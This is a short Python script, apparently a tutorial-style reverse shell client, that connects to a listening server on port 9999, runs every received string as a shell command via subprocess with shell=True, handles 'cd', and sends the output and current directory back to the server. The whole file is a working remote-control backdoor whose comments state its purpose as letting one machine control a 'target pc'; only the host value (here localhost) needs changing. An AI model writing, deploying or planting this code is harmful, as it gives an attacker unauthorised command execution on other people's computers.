import os
import socket
import subprocess  #allow server pc to control target pc

s=socket.socket() #connect host
host='127.0.0.1'
port=9999
s.connect((host, port))
print('Connected to server')

while True:  #loop will execute infinite times. Unless server is closed
    data= s.recv(1024)
    if data[:2].decode('utf-8')=='cd': #change directory
        os.chdir(data[3:].decode('utf-8')) #data[3:] because 0:2= 'cd '. Anything typed onwards would change directory to the typed stuff 
    if len(data)>0:
        cmd= subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) #This takes the input from the cmd and 'PIPES' it up and displays O/P
        output_bytes=cmd.stdout.read() + cmd.stderr.read()
        output_str=str(output_bytes,'utf-8')
        s.send(str.encode(output_str +str(os.getcwd())+'> ')) #os.getcwd displays the current directory, just like cmd
        print(output_str)

#Close connection
s.close()
















































    
    
